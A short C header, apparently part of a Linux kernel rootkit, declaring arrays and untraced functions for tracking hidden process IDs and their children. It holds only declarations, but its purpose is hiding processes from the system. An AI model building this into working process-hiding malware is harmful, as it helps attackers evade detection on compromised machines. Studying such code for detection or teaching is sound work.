#ifndef HIDDEN_PIDS_H
#define HIDDEN_PIDS_H

#define MAX_HIDDEN_PIDS 32
#define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128)

extern int hidden_pids[MAX_HIDDEN_PIDS];
extern int hidden_count;
extern int child_pids[MAX_CHILD_PIDS];
extern int child_count;

notrace void add_child_pid(int pid);
notrace int is_child_pid(int pid);
notrace void add_hidden_pid(int pid);
notrace int is_hidden_pid(int pid);

#endif
